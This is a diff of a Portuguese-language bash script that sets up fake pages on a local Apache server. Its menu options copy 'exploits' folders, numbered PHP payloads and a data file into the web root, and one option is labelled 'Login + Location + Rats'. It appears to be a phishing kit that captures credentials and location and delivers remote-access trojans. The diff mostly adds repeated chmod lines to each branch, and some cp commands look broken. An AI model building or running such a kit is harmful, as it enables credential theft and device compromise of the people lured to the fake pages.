@@ -10,8 +10,8 @@ apache="/var/www/html/page-fake"  # Local do apache
 c="clear" # Limpar
 
 
-#Nivel de permissão de arquivos
-chmod +x $apache/*
+
+
 
 ## Criando pastas
 echo "[** criando nova pasta para o modelo **]"
@@ -167,6 +167,7 @@ process_model_choice() {
             echo "[**Exploits Carregados com sucesso no apache**]"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -194,6 +195,7 @@ process_model_choice() {
             echo "[**Script carregado com sucesso no apache**]"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -209,6 +211,7 @@ process_model_choice() {
             echo "[**Iniciando Apache2**]"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -223,6 +226,8 @@ process_model_choice() {
             echo "[**Script carregado com sucesso no apache**]"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Nivel de permissão de arquivos
+            chmod +x $apache/* #Nivel de permissão de arquivos       
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -236,6 +241,7 @@ process_model_choice() {
             cp  "$type_egs/6.php" "$apache"
             cp  "$type_egs/dados.txt"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -251,6 +257,7 @@ process_model_choice() {
             cp  "$type_egs/exploits/" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -266,6 +273,7 @@ process_model_choice() {
             cp  "$type_egs/8.php" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -281,6 +289,7 @@ process_model_choice() {
             cp  "$type_egs/9.php" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -295,6 +304,7 @@ process_model_choice() {
             cp  "$type_egs/10.php" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -309,6 +319,7 @@ process_model_choice() {
             cp  "$type_egs/11.php" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -322,6 +333,7 @@ process_model_choice() {
             echo -e "${GREEN}Você escolheu: Login + Location + Rats${NC}"
             cp  "$type_egs/12.php" "$apache"
             echo "[**Script carregado com sucesso no apache**]"
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cp  "$type_egs/exploits/" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
@@ -338,6 +350,7 @@ process_model_choice() {
             cp  "$type_egs/13.php" "$apache"
             cp "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Nivel de permissão de arquivos
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Script carregado com sucesso no apache**]"
@@ -351,7 +364,7 @@ process_model_choice() {
             exit 0
             ;;
         *)
-            echo -e "${RED}Opção inválida! Tente novamente.${NC}"
+            echo -e "${RED}Opção inválida! Tente novamente... ${NC}"
             ;;
     esac
 }
